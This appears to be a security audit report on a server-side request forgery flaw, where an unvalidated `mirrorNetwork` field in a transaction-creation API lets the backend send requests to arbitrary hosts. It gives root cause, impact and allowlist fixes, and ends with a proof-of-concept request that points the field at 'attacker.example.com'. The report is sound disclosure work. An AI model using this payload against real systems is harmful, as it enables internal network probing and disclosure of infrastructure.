# Audit Report

## Title
Unvalidated `mirrorNetwork` Field in Transaction Creation Enables Server-Side Request Forgery (SSRF)

## Summary
The `mirrorNetwork` field accepted by `CreateTransactionDto` carries no URL format or allowlist validation. The value is persisted to the database and later used by the backend to construct HTTPS URLs for mirror node REST requests. An authenticated user can supply an arbitrary hostname, causing the backend server to issue HTTP GET requests to attacker-controlled or internal endpoints.

## Finding Description

**Root cause — no validation on `mirrorNetwork`:**

`CreateTransactionDto` decorates `mirrorNetwork` only with `@IsNotEmpty()` and `@IsString()`: [1](#0-0) 

**Unguarded default branch in `MirrorNodeREST.fromBaseURL`:**

Any value that does not match the four known network constants falls through to a `default` case that blindly prepends `https://`: [2](#0-1) 

**URL is used directly in an outbound HTTP request:**

`MirrorNodeClient.getMirrorNodeRESTURL` passes the result of `fromBaseURL` straight into `getMirrorNodeData`, which issues an `axios.get` call: [3](#0-2) [4](#0-3) 

**The value is persisted without sanitization:**

`createTransactions` stores `dto.mirrorNetwork` verbatim into the `Transaction` entity: [5](#0-4) 

Later, background services (`AccountCacheService`, `NodeCacheService`) read `transaction.mirrorNetwork` from the database and pass it to `MirrorNodeClient.fetchAccountInfo` / `fetchNodeInfo`, completing the SSRF chain: [6](#0-5) [7](#0-6) 

## Impact Explanation
An attacker can force the backend server to issue HTTPS GET requests to any hostname they choose. Concrete consequences include:

- **Internal service probing** — reaching internal HTTPS endpoints (e.g., `https://internal-admin.corp/api/v1/accounts/…`) that are not exposed externally.
- **IP/infrastructure disclosure** — the attacker's server receives the request and learns the backend's egress IP and any forwarded headers.
- **Cloud metadata abuse** — on cloud deployments that expose metadata over HTTPS (e.g., some GCP/Azure endpoints), the attacker may retrieve instance metadata.
- **Retry amplification** — `fetchWithRetry` retries up to `MAX_RETRIES = 3` times with exponential backoff, multiplying the number of outbound requests per transaction. [8](#0-7) 

## Likelihood Explanation
- Requires only a valid authenticated session — no elevated privilege is needed.
- The exploit is straightforward: submit a normal transaction creation request with a crafted `mirrorNetwork` value.
- The SSRF fires asynchronously (via background cache refresh jobs), so it is persistent and repeatable for every transaction stored with the malicious value.
- No existing control (DTO validator, service layer, or `MirrorNodeREST.fromBaseURL`) blocks arbitrary hostnames.

## Recommendation
1. **Allowlist `mirrorNetwork` at the DTO layer.** Replace `@IsString()` with `@IsIn([MAINNET, TESTNET, PREVIEWNET, LOCAL_NODE])` (or a custom `@IsEnum` decorator) so only known network identifiers are accepted.
2. **Harden `MirrorNodeREST.fromBaseURL`.** Remove or throw in the `default` branch rather than silently constructing an arbitrary URL.
3. **Validate on read.** Before passing a stored `mirrorNetwork` value to `MirrorNodeClient`, re-validate it against the allowlist so that any legacy or tampered database rows cannot trigger outbound requests.

## Proof of Concept

```http
POST /api/transactions HTTP/1.1
Authorization: Bearer <valid_token>
Content-Type: application/json

{
  "name": "ssrf-test",
  "description": "SSRF PoC",
  "transactionBytes": "<valid_base64_bytes>",
  "creatorKeyId": 1,
  "signature": "<valid_signature>",
  "mirrorNetwork": "attacker.example.com"
}
```

After the transaction is saved, the backend's cache refresh job will issue:

```
GET https://attacker.example.com/api/v1/accounts/<accountId>
GET https://attacker.example.com/api/v1/network/nodes?node.id=eq:<nodeId>
```

The attacker's server receives these requests (up to 3 retries each), confirming the SSRF and exposing the backend's egress IP.
